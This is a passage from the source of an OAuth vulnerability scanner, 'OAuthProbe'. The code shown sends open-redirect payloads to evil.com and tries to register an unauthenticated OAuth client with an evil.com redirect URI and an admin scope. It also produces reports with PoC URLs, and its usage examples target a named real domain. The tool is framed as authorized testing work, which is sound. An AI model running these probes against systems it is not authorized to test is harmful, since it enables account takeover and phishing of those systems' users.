                        "Return invalid_scope error for any scope not registered for the client. "
                        "Never silently ignore unrecognized scopes."
                    ),
                    cvss_estimate="7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N)",
                    poc_url=url_scope,
                ))
                break

        return findings

    # ── Test 6: Open redirect chaining ───────────────────────────────────

    async def test_open_redirect(
        self,
        host: str,
        auth_endpoint: str,
        takeover_candidates: list[str] | None = None,
    ) -> list[OAuthFinding]:
        """
        Test if the authorization endpoint itself acts as an open redirect
        even when the OAuth flow fails. Also tests common open redirect
        parameters adjacent to OAuth flows.
        """
        findings: list[OAuthFinding] = []

        evil_url = "https://evil.com/steal"
        redirect_params = ["redirect", "next", "return", "goto", "continue",
                           "success_url", "callback", "redirect_url"]

        for param in redirect_params[:5]:
            test_url = auth_endpoint + f"?{param}={urllib.parse.quote(evil_url)}"
            status, hdrs, body, loc = await http_get(
                test_url, self.timeout, follow_redirects=False
            )
            self._tests_run += 1
            if loc and "evil.com" in loc:
                findings.append(OAuthFinding(
                    host=host,
                    endpoint=auth_endpoint,
                    test_type="OPEN_REDIRECT",
                    severity="MEDIUM",
                    title=f"Open Redirect on OAuth Endpoint via '{param}' Parameter",
                    detail=(
                        f"The OAuth authorization endpoint at {auth_endpoint} redirects "
                        f"to arbitrary URLs via the '{param}' parameter. Open redirects "
                        f"on OAuth endpoints are particularly dangerous because they can "
                        f"be chained with authorization code leakage — tokens may be "
                        f"sent to attacker-controlled infrastructure via Referer headers."
                    ),
                    evidence=f"GET {test_url} → Location: {loc}",
                    steps_to_reproduce=(
                        f"1. GET {test_url}\n"
                        f"2. Server redirects to {evil_url}"
                    ),
                    recommendation=(
                        "Do not allow arbitrary redirect targets on any OAuth-adjacent "
                        "endpoint. Validate all redirect targets against an allowlist. "
                        "Use relative redirects where possible."
                    ),
                    cvss_estimate="6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)",
                    poc_url=test_url,
                ))

        return findings

    # ── Test 7: Dynamic client registration (if available) ───────────────

    async def test_dynamic_registration(
        self,
        host: str,
        registration_endpoint: str,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not registration_endpoint:
            return findings

        # Attempt unauthenticated registration of a new client
        test_client = {
            "client_name":    "ssrf-test-client",
            "redirect_uris":  ["https://evil.com/callback"],
            "grant_types":    ["authorization_code"],
            "response_types": ["code"],
            "scope":          "openid profile email admin",
        }
        status, _, body, _ = await http_post(
            registration_endpoint,
            json_body=test_client,
            timeout=self.timeout,
        )
        self._tests_run += 1

        if status in (200, 201) and "client_id" in body:
            try:
                data = json.loads(body)
                new_client_id = data.get("client_id", "")
            except Exception:
                new_client_id = "unknown"

            findings.append(OAuthFinding(
                host=host,
                endpoint=registration_endpoint,
                test_type="DYNAMIC_REGISTRATION",
                severity="CRITICAL",
                title="Unauthenticated Dynamic Client Registration Enabled",
                detail=(
                    f"The dynamic client registration endpoint at {registration_endpoint} "
                    f"accepted a new OAuth client registration without authentication "
                    f"(HTTP {status}). A registered client_id of '{new_client_id}' was "
                    f"obtained. An attacker can register their own OAuth client with "
                    f"arbitrary redirect_uris (including evil.com) and use it in a "
                    f"phishing authorization flow against users of this OAuth server."
                ),
                evidence=(
                    f"POST {registration_endpoint}\n"
                    f"Body: {json.dumps(test_client)}\n"
                    f"Response: HTTP {status}  client_id={new_client_id}"
                ),
                steps_to_reproduce=(
                    f"1. POST to {registration_endpoint} with the test payload\n"
                    f"2. Server returned HTTP {status} with a new client_id\n"
                    f"3. Use the new client_id to initiate a legitimate-looking "
                    f"authorization flow with redirect_uri=https://evil.com/callback"
                ),
                recommendation=(
                    "Require bearer token authentication on the dynamic registration "
                    "endpoint (RFC 7591 §3.1). Alternatively, disable open registration "
                    "and require manual client onboarding."
                ),
                cvss_estimate="9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
            ))

        elif status == 200 and "redirect_uris" in body:
            # Unauthenticated read of registered clients
            findings.append(OAuthFinding(
                host=host,
                endpoint=registration_endpoint,
                test_type="REGISTRATION_READ",
                severity="MEDIUM",
                title="OAuth Client Registration Endpoint Readable Without Auth",
                detail=(
                    f"The registration endpoint at {registration_endpoint} returns "
                    f"registered client information without authentication."
                ),
                evidence=f"POST {registration_endpoint} → HTTP 200\n{body[:200]}",
                steps_to_reproduce=f"POST {registration_endpoint} with any body → HTTP 200",
                recommendation="Require authentication on the dynamic registration endpoint.",
            ))

        return findings


# ═════════════════════════════════════════════════════════════════════════════
# INPUT PARSERS
# ═════════════════════════════════════════════════════════════════════════════

def load_takeover_candidates(path: str) -> list[str]:
    """
    Extract VULNERABLE and POTENTIAL subdomain takeover candidates
    from subtakeover.py output.
    """
    candidates: list[str] = []
    with open(path) as f:
        data = json.load(f)
    for finding in data.get("findings", []):
        if finding.get("verdict") in ("VULNERABLE", "POTENTIAL"):
            sub = finding.get("subdomain", "")
            if sub:
                candidates.append(sub)
    log.info(f"[Parse] {len(candidates)} takeover candidates from {path}")
    return candidates


async def discover_all_oauth(
    domain: str,
    js_path: str | None,
    timeout: float,
    manual_client_id: str | None,
    manual_redirect_uri: str | None,
) -> list[tuple[str, OAuthEndpoints]]:
    """
    Discover all OAuth endpoints for a domain.
    Returns list of (base_url, OAuthEndpoints).
    """
    results: list[tuple[str, OAuthEndpoints]] = []
    base_urls = [f"https://{domain}", f"https://auth.{domain}",
                 f"https://login.{domain}", f"https://sso.{domain}",
                 f"https://id.{domain}", f"https://oauth.{domain}",
                 f"https://api.{domain}", f"https://accounts.{domain}"]

    # Load JS-derived hints
    client_ids: list[str] = []
    redirect_uris: list[str] = []
    auth_endpoints_from_js: list[str] = []

    if js_path:
        try:
            with open(js_path) as f:
                js_data = json.load(f)
            cids, ruris, aeps = await extract_oauth_from_js(js_data)
            client_ids.extend(cids)
            redirect_uris.extend(ruris)
            auth_endpoints_from_js.extend(aeps)
            log.info(
                f"[JS] client_ids={len(client_ids)} "
                f"redirect_uris={len(redirect_uris)} "
                f"auth_endpoints={len(auth_endpoints_from_js)}"
            )
        except Exception as exc:
            log.warning(f"[JS] Failed to load {js_path}: {exc}")

    if manual_client_id:
        client_ids.insert(0, manual_client_id)
    if manual_redirect_uri:
        redirect_uris.insert(0, manual_redirect_uri)

    # Try well-known discovery on each base URL
    for base_url in base_urls:
        status, _, body, _ = await http_get(
            base_url, timeout=5, follow_redirects=True
        )
        if status is None:
            continue

        ep = await discover_oauth_from_wellknown(base_url, timeout)
        if not ep:
            ep = await discover_oauth_from_paths(base_url, timeout)

        if ep:
            # Enrich with JS-extracted data
            ep.client_ids    = client_ids
            ep.redirect_uris = redirect_uris

            # Also add auth endpoints from JS that point to this base
            for aep in auth_endpoints_from_js:
                if domain in aep and not ep.authorization_endpoint:
                    ep.authorization_endpoint = aep

            results.append((base_url, ep))

    # If nothing found but JS has endpoints, create synthetic EP
    if not results and auth_endpoints_from_js:
        ep = OAuthEndpoints(
            authorization_endpoint=auth_endpoints_from_js[0],
            client_ids=client_ids,
            redirect_uris=redirect_uris,
        )
        results.append((f"https://{domain}", ep))

    log.info(f"[Discovery] Found OAuth configuration on {len(results)} base URLs")
    return results


# ═════════════════════════════════════════════════════════════════════════════
# REPORTING
# ═════════════════════════════════════════════════════════════════════════════

def print_report(report: OAuthReport) -> None:
    by_sev = {s: [f for f in report.findings if f.severity == s]
              for s in SEVERITY_ORDER}

    if not HAS_RICH:
        print(f"\n=== OAuthProbe: {report.domain} ===")
        print(f"Tests run: {report.total_tests}  "
              f"Elapsed: {report.elapsed_seconds:.1f}s")
        for f in sorted(report.findings, key=lambda x: SEVERITY_ORDER.get(x.severity, 9)):
            print(f"\n[{f.severity}] [{f.test_type}] {f.title}")
            print(f"  {f.endpoint}")
            print(f"  {f.detail[:150]}")
        print()
        return

    border = ("red" if by_sev.get("CRITICAL") else
              "yellow" if by_sev.get("HIGH") else "blue")
    console.print()
    console.print(Panel.fit(
        f"[white]Domain:[/] [cyan]{report.domain}[/]\n"
        f"[white]Scan time:[/] {report.scan_time}\n"
        f"[white]Elapsed:[/] {report.elapsed_seconds:.1f}s\n"
        f"[white]OAuth endpoints found:[/] {len(report.endpoints_found)}\n"
        f"[white]Tests run:[/] {report.total_tests}\n\n"
        f"[bold red]CRITICAL:[/] {len(by_sev.get('CRITICAL',[]))}    "
        f"[bold yellow]HIGH:[/] {len(by_sev.get('HIGH',[]))}    "
        f"[yellow]MEDIUM:[/] {len(by_sev.get('MEDIUM',[]))}    "
        f"[cyan]LOW:[/] {len(by_sev.get('LOW',[]))}",
        title="[bold]OAuthProbe Report[/]",
        border_style=border,
    ))

    # Endpoint summary
    if report.endpoints_found:
        console.print("\n[bold cyan]── OAuth Endpoints Discovered ──[/]")
        for ep in report.endpoints_found:
            if ep.authorization_endpoint:
                console.print(f"  [cyan]Auth:[/] {ep.authorization_endpoint}")
            if ep.token_endpoint:
                console.print(f"  [dim]Token:[/] {ep.token_endpoint}")
            if ep.issuer:
                console.print(f"  [dim]Issuer:[/] {ep.issuer}")
            if ep.client_ids:
                console.print(f"  [dim]Client IDs:[/] {', '.join(ep.client_ids[:3])}")
            if ep.redirect_uris:
                console.print(f"  [dim]Redirect URIs:[/] {', '.join(ep.redirect_uris[:3])}")

    if not report.findings:
        console.print("\n[bold green]✓ No OAuth vulnerabilities found.[/]")
        if not report.endpoints_found:
            console.print(
                "[dim]  No OAuth endpoints were discovered. "
                "If the target uses OAuth, provide --client-id and --redirect-uri "
                "to enable redirect_uri bypass and state parameter testing.[/]"
            )
        console.print()
        return

    # Findings
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        col = SEV_COLOR.get(sev, "white")
        console.print(f"\n[{col}]── {SEV_EMOJI.get(sev,'')} {sev} ({len(sf)}) ──[/]")
        for i, f in enumerate(sf, 1):
            console.print(
                f"  [{col}][{i}][/] [white]{f.title}[/]\n"
                f"      [dim]Type:[/] {f.test_type}  [dim]Host:[/] {f.host}\n"
                f"      [dim]Endpoint:[/] {f.endpoint}\n"
                f"      [dim]Detail:[/] {f.detail[:200]}{'...' if len(f.detail)>200 else ''}"
            )
            if f.evidence:
                console.print(f"      [dim]Evidence:[/] {escape(f.evidence[:160])}")
            if f.poc_url:
                console.print(f"      [dim]PoC URL:[/] {escape(f.poc_url[:120])}")
            if f.cvss_estimate:
                console.print(f"      [dim]CVSS:[/] {f.cvss_estimate}")
            if i < len(sf):
                console.print()
    console.print()


def save_json(report: OAuthReport, path: str) -> None:
    data = {
        "domain":            report.domain,
        "scan_time":         report.scan_time,
        "source_files":      report.source_files,
        "elapsed_seconds":   report.elapsed_seconds,
        "total_tests":       report.total_tests,
        "endpoints_found":   [asdict(ep) for ep in report.endpoints_found],
        "summary": {s: len([f for f in report.findings if f.severity == s])
                    for s in SEVERITY_ORDER},
        "findings": [asdict(f) for f in sorted(
            report.findings,
            key=lambda f: SEVERITY_ORDER.get(f.severity, 9)
        )],
    }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    log.info(f"JSON report saved → {path}")
    log.info(f"  findings[]: {len(report.findings)}")


def save_html(report: OAuthReport, path: str) -> None:
    by_sev = {s: [f for f in report.findings if f.severity == s]
              for s in SEVERITY_ORDER}
    sc = {"CRITICAL":"#f85149","HIGH":"#d29922","MEDIUM":"#e3b341",
          "LOW":"#58a6ff","INFO":"#8b949e"}
    sb = {"CRITICAL":"rgba(248,81,73,.12)","HIGH":"rgba(210,153,34,.12)",
          "MEDIUM":"rgba(227,179,65,.10)","LOW":"rgba(88,166,255,.10)",
          "INFO":"rgba(139,148,158,.08)"}

    ep_html = ""
    for ep in report.endpoints_found:
        if ep.authorization_endpoint:
            ep_html += (
                f"<div style='padding:6px 0;border-bottom:1px solid #1e2d3d'>"
                f"<span style='color:#39c5cf'>Auth:</span> "
                f"<code style='color:#58a6ff'>{ep.authorization_endpoint}</code>"
            )
            if ep.issuer:
                ep_html += f"<br><span style='color:#627384'>Issuer: {ep.issuer}</span>"
            if ep.client_ids:
                ep_html += f"<br><span style='color:#627384'>Client IDs: {', '.join(ep.client_ids[:3])}</span>"
            if ep.redirect_uris:
                ep_html += f"<br><span style='color:#627384'>Redirect URIs: {', '.join(ep.redirect_uris[:3])}</span>"
            ep_html += "</div>"

    findings_html = ""
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
        sf = by_sev.get(sev, [])
        if not sf:
            continue
        findings_html += (
            f'<div class="sev-section">'
            f'<h3 style="color:{sc[sev]}">{SEV_EMOJI.get(sev,"")} {sev} ({len(sf)})</h3>'
        )
        for i, f in enumerate(sf, 1):
            poc_e   = (f.poc_url or "").replace("<","&lt;").replace(">","&gt;")
            ev_e    = f.evidence.replace("<","&lt;").replace(">","&gt;")
            stps_e  = f.steps_to_reproduce.replace("<","&lt;").replace(">","&gt;").replace("\n","<br>")
            findings_html += (
                f'<div class="finding" style="border-left:3px solid {sc[sev]};'
                f'background:{sb[sev]}">'
                f'<div class="ft">[{i}] {f.title}</div>'
                f'<div class="fm">'
                f'<span class="badge" style="color:{sc[sev]};background:{sb[sev]};'
                f'border:1px solid {sc[sev]}">{sev}</span>'
                f'<span style="color:#39c5cf;font-size:.8em">{f.test_type}</span>'
                f'<span style="color:#58a6ff;font-size:.8em">{f.host}</span>'
                + (f'<span style="color:#d29922;font-size:.75em">{f.cvss_estimate}</span>'
                   if f.cvss_estimate else "")
                + f'</div>'
                f'<div class="fd">{f.detail}</div>'
                + (f'<div class="ev"><span class="evl">Evidence:</span>'
                   f'<code>{ev_e[:300]}</code></div>' if f.evidence else "")
                + (f'<div class="ev"><span class="evl">Reproduce:</span>'
                   f'<div style="margin-top:4px;color:#a8dadc;font-size:.82em;line-height:1.6">'
                   f'{stps_e}</div></div>' if f.steps_to_reproduce else "")
                + (f'<div class="ev"><span class="evl">PoC URL:</span>'
                   f'<code>{poc_e[:200]}</code></div>' if f.poc_url else "")
                + f'<div class="rec"><span class="recl">Fix:</span> {f.recommendation}</div>'
                + f'</div>'
            )
        findings_html += "</div>"

    if not findings_html:
        findings_html = "<p style='color:#3fb950'>No OAuth vulnerabilities found.</p>"

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>OAuthProbe — {report.domain}</title>
<style>
:root{{--bg:#080c10;--sf:#0d1117;--sf2:#111820;--bd:#1e2d3d;--tx:#cdd6e0;--mt:#627384;}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--tx);font-family:'Consolas','Monaco',monospace;
     font-size:13px;line-height:1.7}}
body::before{{content:'';position:fixed;inset:0;
  background-image:linear-gradient(rgba(0,212,255,.012) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(0,212,255,.012) 1px,transparent 1px);
  background-size:40px 40px;pointer-events:none;z-index:0}}
.wrap{{max-width:1400px;margin:0 auto;padding:32px 28px 80px;position:relative;z-index:1}}
h1{{font-family:system-ui,sans-serif;font-size:2em;font-weight:800;color:#fff;
   letter-spacing:-.03em;margin-bottom:6px}}
.sub{{color:var(--mt);font-size:.8em;margin-bottom:32px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));
        gap:10px;margin-bottom:28px}}
.stat{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:14px;text-align:center}}
.sv{{font-size:1.8em;font-weight:bold}}.sl{{color:var(--mt);font-size:.72em;margin-top:3px}}
.card{{background:var(--sf);border:1px solid var(--bd);border-radius:8px;
       padding:20px;margin-bottom:20px}}
h2{{font-family:system-ui,sans-serif;font-size:1.1em;font-weight:700;color:#fff;
   margin-bottom:14px}}
h3{{font-family:system-ui,sans-serif;font-size:.95em;font-weight:700;margin:16px 0 10px}}
.finding{{padding:14px 16px;border-radius:6px;margin-bottom:10px}}
.ft{{font-family:system-ui,sans-serif;font-weight:700;font-size:.9em;color:#fff;
    margin-bottom:8px}}
.fm{{display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap}}
.badge{{padding:2px 8px;border-radius:10px;font-size:.7em;font-weight:700;letter-spacing:.05em}}
.fd{{color:var(--mt);font-size:.83em;margin-bottom:8px;line-height:1.6}}
.ev{{background:rgba(0,0,0,.4);border:1px solid var(--bd);border-radius:4px;
     padding:8px 10px;margin-bottom:8px}}
.evl{{color:#39c5cf;font-size:.7em;font-weight:700;margin-right:6px}}
.ev code{{color:#a8dadc;font-size:.82em;word-break:break-all}}
.rec{{color:#3fb950;font-size:.8em}}.recl{{font-weight:700;margin-right:4px}}
.sev-section{{margin-bottom:20px}}
.footer{{text-align:center;color:var(--mt);font-size:.72em;margin-top:32px;
         padding-top:16px;border-top:1px solid var(--bd)}}
</style></head>
<body><div class="wrap">
<h1>OAuthProbe</h1>
<p class="sub">{report.domain} &nbsp;·&nbsp; {report.scan_time} &nbsp;·&nbsp;
{report.elapsed_seconds:.1f}s &nbsp;·&nbsp; {report.total_tests} tests</p>
<div class="stats">
<div class="stat"><div class="sv" style="color:#f85149">{len(by_sev.get('CRITICAL',[]))}</div><div class="sl">CRITICAL</div></div>
<div class="stat"><div class="sv" style="color:#d29922">{len(by_sev.get('HIGH',[]))}</div><div class="sl">HIGH</div></div>
<div class="stat"><div class="sv" style="color:#e3b341">{len(by_sev.get('MEDIUM',[]))}</div><div class="sl">MEDIUM</div></div>
<div class="stat"><div class="sv" style="color:#58a6ff">{len(by_sev.get('LOW',[]))}</div><div class="sl">LOW</div></div>
<div class="stat"><div class="sv">{len(report.endpoints_found)}</div><div class="sl">ENDPOINTS</div></div>
<div class="stat"><div class="sv">{report.total_tests}</div><div class="sl">TESTS</div></div>
</div>
{f'<div class="card"><h2>🔑 OAuth Endpoints</h2>{ep_html}</div>' if ep_html else ''}
<div class="card"><h2>🔎 Findings</h2>{findings_html}</div>
<div class="footer">OAuthProbe &nbsp;·&nbsp; For authorized security research only</div>
</div></body></html>"""

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    log.info(f"HTML report saved → {path}")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="OAuthProbe — OAuth 2.0 & SSO Flow Vulnerability Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-discover OAuth from domain + JS output:
  python3 oauthprobe.py --js js-findings.json --domain eskimi.com --output oauth

  # With subtakeover candidates for maximum redirect_uri impact:
  python3 oauthprobe.py --js js-findings.json --domain eskimi.com \\
      --subtakeover scan.json --output oauth

  # Provide credentials manually when auto-discovery fails:
  python3 oauthprobe.py --domain eskimi.com \\
      --client-id abc123 \\
      --redirect-uri https://app.eskimi.com/callback \\
      --output oauth

  # Domain-only (no JS) — tries well-known paths and common OAuth routes:
  python3 oauthprobe.py --domain eskimi.com --output oauth

Test modules run:
  state         Missing/predictable state parameter (CSRF)
  redirect_uri  30+ bypass techniques (traversal, wildcard, takeover chain)
  pkce          Missing PKCE / plain method accepted
  implicit      Implicit flow / response_type=token accepted
  scope         Admin scope escalation
  open_redirect Open redirect on OAuth endpoints
  dynamic_reg   Unauthenticated dynamic client registration

Chains from : jsreaper.py (--js), subtakeover.py (--subtakeover)
Output      : JSON + HTML with PoC URLs and step-by-step reproduction
        """,
    )
    p.add_argument("--domain",         required=True,  help="Target root domain")
    p.add_argument("--js",             metavar="FILE",
                   help="jsreaper.py output JSON (OAuth endpoints + client_ids)")
    p.add_argument("--subtakeover",    metavar="FILE",
                   help="subtakeover.py scan.json (adds takeover candidates to redirect_uri tests)")
    p.add_argument("-o","--output",    metavar="BASE",  help="Output base → BASE.json + BASE.html")
    p.add_argument("--client-id",      metavar="ID",
                   help="Known OAuth client_id (use when auto-discovery finds none)")
    p.add_argument("--redirect-uri",   metavar="URI",
                   help="Known redirect_uri to test bypass techniques against")
    p.add_argument("--timeout",        type=float, default=10.0,
                   help="HTTP timeout per request (default: 10s)")
    p.add_argument("--concurrency",    type=int,   default=10,
                   help="Concurrent test workers (default: 10)")
    p.add_argument("-v","--verbose",   action="store_true", help="Verbose logging")
    return p.parse_args()


async def main() -> None:
    args = parse_args()
    if args.verbose:
        log.setLevel(logging.DEBUG)

    print("""
╔══════════════════════════════════════════════════════════════════╗
║         OAuthProbe — OAuth 2.0 & SSO Flow Testing                ║
║  For authorized penetration testing and bug bounty research only ║
╚══════════════════════════════════════════════════════════════════╝
""")

    if not HAS_HTTPX:
        log.error("httpx required: pip install httpx")
        sys.exit(1)

    source_files: list[str] = []
    if args.js:         source_files.append(args.js)
    if args.subtakeover: source_files.append(args.subtakeover)

    # Load subtakeover candidates
    takeover_candidates: list[str] = []
    if args.subtakeover:
        takeover_candidates = load_takeover_candidates(args.subtakeover)
        if takeover_candidates:
            log.info(
                f"[Config] {len(takeover_candidates)} takeover candidates — "
                f"redirect_uri bypass tests will use these for CRITICAL-severity chain"
            )

    report = OAuthReport(
        domain=args.domain,
        scan_time=datetime.datetime.now(datetime.timezone.utc).isoformat(),
        source_files=source_files or ["domain-only"],
    )

    tester = OAuthTester(domain=args.domain, timeout=args.timeout)
    t0     = time.perf_counter()

    # Discover OAuth endpoints
    log.info(f"[Discovery] Discovering OAuth endpoints for {args.domain}...")
    discovered = await discover_all_oauth(
        args.domain, args.js, args.timeout,
        args.client_id, args.redirect_uri,
    )

    if not discovered:
        log.warning(
            "No OAuth endpoints found. "
            "If the target uses OAuth, try --client-id and --redirect-uri "
            "to enable testing without auto-discovery."
        )
        report.elapsed_seconds = round(time.perf_counter() - t0, 2)
        print_report(report)
        if args.output:
            out_base = args.output
            if out_base.endswith(".json"):
                out_base = out_base[:-5]
            if out_base.endswith(".html"):
                out_base = out_base[:-5]
            save_json(report, out_base + ".json")
            save_html(report, out_base + ".html")
        return

    for base_url, ep in discovered:
        report.endpoints_found.append(ep)
        host = urllib.parse.urlparse(base_url).netloc

        # For each (client_id, redirect_uri) combination, run all test modules
        cids   = ep.client_ids   or (["__unknown__"] if ep.authorization_endpoint else [])
        ruris  = ep.redirect_uris or (["https://app." + args.domain + "/callback"]
                                       if ep.authorization_endpoint else [])

        # Take the first client_id and redirect_uri for most tests
        client_id    = cids[0]   if cids   else ""
        redirect_uri = ruris[0]  if ruris  else ""

        if not ep.authorization_endpoint:
            log.debug(f"[{host}] No authorization endpoint — skipping tests")
            continue

        log.info(
            f"[{host}] Testing auth_endpoint={ep.authorization_endpoint} "
            f"client_id={client_id[:20] if client_id != '__unknown__' else 'unknown'} "
            f"redirect_uri={redirect_uri[:50] if redirect_uri else 'none'}"
        )

        # Run all test modules
        test_tasks = []

        if client_id and client_id != "__unknown__" and redirect_uri:
            test_tasks += [
                tester.test_state_param(host, ep.authorization_endpoint,
                                        client_id, redirect_uri),
                tester.test_redirect_uri(host, ep.authorization_endpoint,
                                         client_id, redirect_uri, takeover_candidates),
                tester.test_pkce(host, ep.authorization_endpoint,
                                 client_id, redirect_uri),
                tester.test_implicit_flow(host, ep.authorization_endpoint,
                                          client_id, redirect_uri),
                tester.test_scope_escalation(host, ep.authorization_endpoint,
                                             client_id, redirect_uri, ep),
            ]
        elif client_id == "__unknown__":
            log.info(
                f"[{host}] No client_id found — skipping state/redirect_uri tests. "
                f"Use --client-id to enable them."
            )

        test_tasks.append(
            tester.test_open_redirect(host, ep.authorization_endpoint, takeover_candidates)
        )

        if ep.registration_endpoint:
            test_tasks.append(
                tester.test_dynamic_registration(host, ep.registration_endpoint)
            )

        sem = asyncio.Semaphore(args.concurrency)

        async def bounded_test(coro) -> list[OAuthFinding]:
            async with sem:
                try:
                    return await coro
                except Exception as exc:
                    log.debug(f"Test error: {exc}")
                    return []

        results = await asyncio.gather(
            *[bounded_test(t) for t in test_tasks],
            return_exceptions=True,
        )

        for r in results:
            if isinstance(r, list):
                report.findings.extend(r)

    report.total_tests     = tester._tests_run
    report.elapsed_seconds = round(time.perf_counter() - t0, 2)
    report.findings        = sorted(
        report.findings,
        key=lambda f: SEVERITY_ORDER.get(f.severity, 9)
    )

    print_report(report)

    if args.output:
        out_base = args.output
        if out_base.endswith(".json"):
            out_base = out_base[:-5]
        save_json(report, out_base + ".json")
        save_html(report, args.output + ".html")

    crit = len([f for f in report.findings if f.severity == "CRITICAL"])
    high = len([f for f in report.findings if f.severity == "HIGH"])
    if crit or high:
        log.warning(
            f"[!] {crit} CRITICAL + {high} HIGH OAuth findings — "
            f"these are account takeover vectors, report immediately"
        )


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
